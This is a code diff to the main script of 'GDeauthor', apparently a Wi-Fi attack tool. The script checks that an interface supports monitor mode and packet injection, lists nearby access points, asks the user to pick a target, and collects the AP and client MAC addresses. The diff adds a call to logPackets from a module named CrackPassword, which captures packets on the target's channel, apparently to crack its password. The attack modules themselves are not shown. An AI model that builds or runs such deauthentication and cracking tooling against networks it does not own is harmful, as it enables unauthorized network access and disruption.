@@ -3,8 +3,10 @@ from CheckMonitorMode import checkMonitor
 from CheckPacketInjection import checkPacketInjection
 from ActivateMonitorMode import activateMonitorMode
 from listAccessPoints import listAccessPoints
-from DeactivateMonitorMode import deactivateMonitorMode
+from DeactivateMonitorMode import deactivateMonitorModeAir
+from DeactivateMonitorMode import deactivateMonitorModeMain
 from GetMACAddresses import getMACAddresses
+from CrackPassword import logPackets
 def main():
     print("Welcome to GDeauthor! Select a Network Interface that supports Monitor Mode and Packet Injection. Here are the list of available interfaces:")
     interfaces = listInterfaces()
@@ -20,10 +22,13 @@ def main():
        print("[-]Interface does not support monitor mode.")
        exit()
     if(checkMonitor(interface)==-1):
-        deactivateMonitorMode(interface)
-    if(not checkPacketInjection(interface)):
+        deactivateMonitorModeAir(interface)
+    packetInjectionResult = checkPacketInjection(interface)
+    deactivateMonitorModeMain(interface)
+    if(not packetInjectionResult):
         print("Interface does not support packet injection")
         exit()
+
     print("[+]Activating Monitor Mode...\n\nHowever, before we do that")
     APlist = listAccessPoints()
     print("[+]Choose your target:")
@@ -32,7 +37,7 @@ def main():
     targetAP = input("[+]Target,please:")
     if targetAP not in APlist:
         print("Choose a proper target please!")
-        deactivateMonitorMode(interface)
+        deactivateMonitorModeAir(interface)
         exit()
     print("[+]Target Selected")
     print("Also,")
@@ -41,9 +46,14 @@ def main():
     MACs = getMACAddresses(targetAP)
     if MACs["Client MAC"] == 0:
         print("No clients are connected to the AP. Cannot perform Deauthentication")
+        deactivateMonitorModeAir(interface)
         exit()
     print("MAC Address of AP: ",MACs["AP MAC"])
     print("MAC Address of Client: ",MACs["Client MAC"])
+    print("Channel for AP: ",MACs["AP Channel"])
+    logPackets(MACs["AP Channel"],MACs["AP MAC"],MACs["Client MAC"])
+    deactivateMonitorModeAir(interface)
+
 
 
     
